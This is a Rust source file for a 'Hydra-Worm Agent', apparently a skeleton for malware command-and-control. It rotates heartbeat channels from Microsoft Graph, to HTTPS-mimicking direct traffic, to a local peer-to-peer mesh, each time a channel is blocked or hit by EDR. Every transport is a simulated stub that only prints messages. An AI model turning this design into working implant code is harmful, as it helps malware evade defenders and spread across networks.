// Project: Hydra-Worm Agent
// Phase: 1.1 - Transport Abstraction & Mutation
// Logic: Cloud API -> Malleable Direct -> P2P Mesh

use std::thread;
use std::time::Duration;

/// The core contract for all communication modules.
trait Transport {
    fn send_heartbeat(&self) -> Result<(), &'static str>;
    fn get_name(&self) -> String;
}

// --- TRANSPORT TIER 1: CLOUD API ---
struct CloudTransport { endpoint: String }
impl Transport for CloudTransport {
    fn send_heartbeat(&self) -> Result<(), &'static str> {
        println!("[!] C2-CLOUD: Attempting connection to {}...", self.endpoint);
        Err("403 Forbidden - Domain Blocked") // Simulated failure
    }
    fn get_name(&self) -> String { "Cloud-API".into() }
}

// --- TRANSPORT TIER 2: MALLEABLE DIRECT ---
struct MalleableTransport { c2_ip: String }
impl Transport for MalleableTransport {
    fn send_heartbeat(&self) -> Result<(), &'static str> {
        println!("[!] C2-DIRECT: Mimicking legitimate HTTPS to {}...", self.c2_ip);
        Err("TCP RST - EDR Intervention") // Simulated failure
    }
    fn get_name(&self) -> String { "Malleable-Direct".into() }
}

// --- TRANSPORT TIER 3: P2P MESH ---
struct P2PTransport;
impl Transport for P2PTransport {
    fn send_heartbeat(&self) -> Result<(), &'static str> {
        println!("[!] C2-P2P: Internet lost. Broadcasting to local subnet peers...");
        Ok(()) // Success!
    }
    fn get_name(&self) -> String { "P2P-Gossip-Mesh".into() }
}

// --- THE MUTATION ENGINE ---
struct Agent {
    transport: Box<dyn Transport>,
    failures: u32,
    state: u8, // 0: Cloud, 1: Direct, 2: P2P
}

impl Agent {
    fn new() -> Self {
        Self {
            transport: Box::new(CloudTransport { endpoint: "graph.microsoft.com".into() }),
            failures: 0,
            state: 0,
        }
    }

    fn run(&mut self) {
        loop {
            println!("\n[*] Current Strategy: {}", self.transport.get_name());
            match self.transport.send_heartbeat() {
                Ok(_) => self.failures = 0,
                Err(e) => {
                    println!("[-] Failure: {}", e);
                    self.failures += 1;
                }
            }

            if self.failures >= 3 {
                self.mutate();
            }

            thread::sleep(Duration::from_secs(3));
        }
    }

    fn mutate(&mut self) {
        self.state = (self.state + 1) % 3;
        self.failures = 0;
        println!("[!!!] ALERT: Triggering Transport Mutation...");

        self.transport = match self.state {
            0 => Box::new(CloudTransport { endpoint: "graph.microsoft.com".into() }),
            1 => Box::new(MalleableTransport { c2_ip: "192.168.1.50".into() }),
            _ => Box::new(P2PTransport),
        };
    }
}

fn main() {
    println!("--- HYDRA-WORM R&D FRAMEWORK ---");
    let mut agent = Agent::new();
    agent.run();
}